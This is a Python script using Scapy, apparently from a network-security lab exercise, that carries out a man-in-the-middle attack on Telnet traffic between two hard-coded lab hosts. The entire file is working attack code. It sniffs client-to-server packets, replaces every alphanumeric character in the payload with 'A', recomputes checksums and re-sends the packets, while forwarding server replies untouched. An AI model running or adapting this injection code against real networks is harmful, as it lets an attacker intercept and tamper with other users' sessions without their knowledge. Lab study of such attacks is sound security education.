#!/usr/bin/env python3
import re
from scapy.all import *

CLIENT_IP = "10.0.2.4"
CLIENT_MAC = "08:00:27:26:8a:ce"
SERVER_IP = "10.0.2.5"
SERVER_MAC = "08:00:27:57:7d:99"
ATTACKER_IP = "10.0.2.6"
ATTACKER_MAC = "08:00:27:d4:91:13"

print("LAUNCHING MITM ATTACK....")

def spoof_pkt(pkt):
    if pkt[IP].src == CLIENT_IP and pkt[IP].dst == SERVER_IP:
    # Create a new packet based on the captured one.
    # 1) We need to delete the checksum in the IP & TCP headers,
    # because our modification will make them invalid.
    # Scapy will recalculate them if these fields are missing.
    # 2) We also delete the original TCP payload.

            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)

            if pkt[TCP].payload:
                data = pkt[TCP].payload.load
                print("*** %s, length: %d" % (data, len(data)))

                decoded_data = data.decode('utf-8', errors='ignore')
                # Replace alphanumeric characters with 'A'
                newdata = re.sub(r'[0-9a-zA-Z]', 'A', decoded_data)
                send(newpkt/newdata)
            else:
                send(newpkt)

    # For packets from server to client, the program does not make any change
    elif pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP:
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            send(newpkt)

# Sniff Telnet traffic and replace alpha characters with 'A'
sniff(filter=f'tcp and (ether src {CLIENT_MAC} or ether src {SERVER_MAC})', prn=spoof_pkt)
